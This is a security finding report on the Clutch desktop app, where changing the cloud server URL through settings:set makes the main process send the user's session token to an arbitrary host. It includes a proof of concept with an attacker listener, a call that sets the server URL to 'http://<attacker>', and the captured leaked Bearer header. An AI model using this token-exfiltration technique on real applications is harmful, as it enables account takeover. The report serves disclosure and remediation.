# Cloud session token is sent to whatever server URL settings:set supplies, letting a compromised renderer exfiltrate the main-process-only token

**ID:** vuln-0011
**Severity:** MEDIUM
**Found:** 2026-11-19 17:05:49 UTC
**Target:** Clutch desktop app (src/main/cloud/account.ts, settings:set IPC)
**CWE:** CWE-201
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

The Clutch account session token is meant to stay in the main process ("The renderer never sees the token"). However `CloudAccount.api()` attaches `Authorization: Bearer <token>` to every request sent to `settings.cloud.serverUrl`, the token is not bound to the server it was issued by, and `settings:set` lets the renderer change `cloud.serverUrl` to any URL (including plain http). Changing the URL immediately triggers an authenticated `GET /api/me` to the new host.

## Evidence

```
ATTACKER SERVER got GET /api/me Authorization: Bearer SESSION-TOKEN-ABC123-SECRET
```
Output of the PoC after a single `settings.set` call that only changed `cloud.serverUrl`.

## Impact

Script running in the renderer (or a user tricked into entering an attacker's "self-hosted server" URL in Settings → Account) obtains the user's valid Clutch session token. The token authorizes the account's cloud API (listing/deleting shared clips, creating share links, billing portal and checkout links, YouTube token minting via `/api/youtube/token`). The token is long-lived and the server has no session revocation (documented as not changed). Demonstrated: token received by a listener on a different origin immediately after one settings change.

## Counterevidence

Requires script execution in the renderer (strict CSP, React escaping and no HTML sinks were observed, so no such foothold is demonstrated) or an explicit user action of entering a hostile server URL. A renderer that can call `settings:set` can also cause other harm; this finding is specific because it breaks the documented invariant that the token is not renderer-reachable. No origin binding, URL validation, or token clearing exists on the path (checked `index.ts` settings handlers and `account.ts`).

## What Would Change This Severity

A demonstrated renderer XSS would raise this (account takeover for the token's lifetime); server-side session revocation and short token lifetimes would lower it.

## Technical Analysis

`src/main/index.ts` creates `new CloudAccount(() => settings.get().cloud.serverUrl)` and, on any change of `cloud.serverUrl`, calls `account.refresh()`:

```ts title=index.ts startLineNumber=257 endLineNumber=258
let lastServer = settings.get().cloud.serverUrl
settings.onChange((s) => { if (s.cloud.serverUrl !== lastServer) { lastServer = s.cloud.serverUrl; void account.refresh() } })
```

`refresh()` calls `api('GET', '/api/me')`, and `api()` attaches the stored token regardless of which origin the base URL now points to:

```ts title=account.ts startLineNumber=56 endLineNumber=63

  const base = this.base()
  ...
  const r = await fetch(`${base}${p}`, {
    method,
    headers: { ...(this.token ? { Authorization: `Bearer ${this.token}` } : {}), ...
```

`settings:set` (`ipcMain.handle('settings:set', (_e, patch) => settings.set(patch))`) performs no validation of `cloud.serverUrl` (scheme, origin allow-list). The token file (`account.bin`) does not record which server issued the token, and the token is not cleared when the server URL changes. The same applies to the Settings UI (Account.tsx saves the typed URL straight into settings), so the user's old-server token is also sent to a newly entered server, over cleartext if `http://` is used. A hostile server can additionally answer 401, which makes `api()` delete the legitimate token.

## Proof of Concept

1. Start a listener standing in for an attacker server.
2. Put a session token in the app's token file (as exists after sign-in) and construct the real `SettingsStore` and `CloudAccount` with the same wiring as `src/main/index.ts` (serverUrl getter and the `onChange` handler that calls `refresh()`).
3. Perform the call a compromised renderer makes: `settings.set({ cloud: { ...cloud, serverUrl: 'http://<attacker>' } })`.
4. Observe the listener receive `GET /api/me` with the victim's `Authorization: Bearer` header without any further interaction.

```ts

import fs from 'node:fs'

import { CloudAccount } from './cloud/account'

// signed-in user: encrypted token on disk, readable only by the main process

const attacker = http.createServer((req, res) => {
  console.log('ATTACKER SERVER got', req.method, req.url, 'Authorization:', req.headers.authorization)
  res.setHeader('content-type', 'application/json'); res.end('{}')
}).listen(0, '127.0.0.1', () => {
  const port = (attacker.address() as any).port
  const store = new SettingsStore()
  const account = new CloudAccount(() => store.get().cloud.serverUrl)        // index.ts:235
```

## Remediation

Bind the session token to the origin that issued it: persist the issuing origin with the token, send the Authorization header only when the current server origin matches it, and discard the token (and sign the user out) whenever the server URL changes. Validate `cloud.serverUrl` in the main process (require https, allow http only for loopback development) rather than trusting the renderer's `settings:set` patch, and ideally move server selection out of the generic settings patch into a dedicated, validated IPC handler. Do not clear the stored token on a 401 from a server other than the issuing one.

## Fix Verification

No fix_after supplied: the complete fix touches token persistence, the api() header construction and the settings handler, and was not executed against the repository tests or on Windows. Remediation is given in prose only.

## Assumptions

Attacker can run script in the renderer, or can persuade the user to type an attacker-controlled server URL into Settings → Account while signed in. Linux harness with stubbed `electron`; DPAPI decryption (done by the main process in production) is not relevant to the leak.
